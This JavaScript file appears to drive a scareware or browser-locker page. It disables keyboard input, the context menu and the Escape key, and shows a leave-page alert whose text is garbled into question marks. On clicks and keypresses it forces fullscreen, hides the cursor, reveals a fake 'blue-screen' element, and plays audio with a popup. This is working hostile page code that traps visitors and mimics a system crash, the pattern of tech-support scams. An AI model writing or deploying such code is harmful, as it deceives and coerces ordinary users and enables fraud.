window.onkeydown = function(evt){ return false;};
window.onkeypress = function(evn){ return false;};
//window.onbeforeunload = function(evt1){ return false;};

/* window.onbeforeunload=function(){
    return "Are you sure to leave this page?";
	myFunc();
} */

/* function pageLoaded()
{
    alert("load event handler called.");
}

function pageUnloaded()
{
    alert("unload event handler called.");
}

window.addEventListener("load", pageLoaded, false);
window.addEventListener("unload", pageUnloaded, false); */

onbeforeunload=function() {alert ("??????? ESC, ????? ??????? ????????!"); return "??????? ESC, ????? ??????? ????????!";}
document.oncontextmenu=new Function("return false");

for(var _i=0;_i<2;_i++){
	 
}

function newLine(){
	
	//document.getElementById("light-screen").style.display="none";
	document.getElementById("blue-screen").style.display="block";
	document.getElementsByTagName("body").item(0).setAttribute('class','past');
}


function toggleFullScreen()
{
	
	if (!document.fullscreenElement &&  !document.mozFullScreenElement && !document.webkitFullscreenElement)
	{
		if (document.documentElement.requestFullscreen)
		{
			document.documentElement.requestFullscreen();

		}
		else if (document.documentElement.mozRequestFullScreen)
		{
			document.documentElement.mozRequestFullScreen();

		}
		else if (document.documentElement.webkitRequestFullscreen)
		{
			document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
		}
	}
	openBrowser();
}

document.addEventListener('keyup', function(es)
{
	if (es.keyCode == 27)
	{
		return false;
		//toggleFullScreen();

	}
}
, false);
document.addEventListener('keyup', function(e)
{
	if (e.keyCode == 122 || e.keyCode == 17 || e.keyCode == 18 || e.keyCode == 13)
	{
		newLine();
		toggleFullScreen();

	}
}
, false);

window.onload = function ()
{
	document.onclick = function (e)
	{
		
		e = e || event;
		target = e.target || e.srcElement;
		if (target.tagName == "DIV")
		{
			toggleFullScreen();
			document.body.style.cursor = 'none';
			newLine();
		}
		else
		{
			toggleFullScreen();
			document.body.style.cursor = 'none';
			newLine();
		}

	}
}

addEventListener("click", function() {
	newLine();
	var
			el = document.documentElement
			, rfs =
					el.requestFullScreen
					|| el.webkitRequestFullScreen
					|| el.mozRequestFullScreen
			;

	rfs.call(el);

});

window.addEventListener('resize', function(){
  $("body").css('overflow','hidden');
  $(".popup-alert").stop().animate({bottom:'-10px', opacity:1},500);
  document.getElementById("play").play();
  if(screen.width === window.innerWidth){}

  window.setInterval(function(){
    for(var i=0;i<100;i++)
    {
     	 
    
    }
}, 500);

});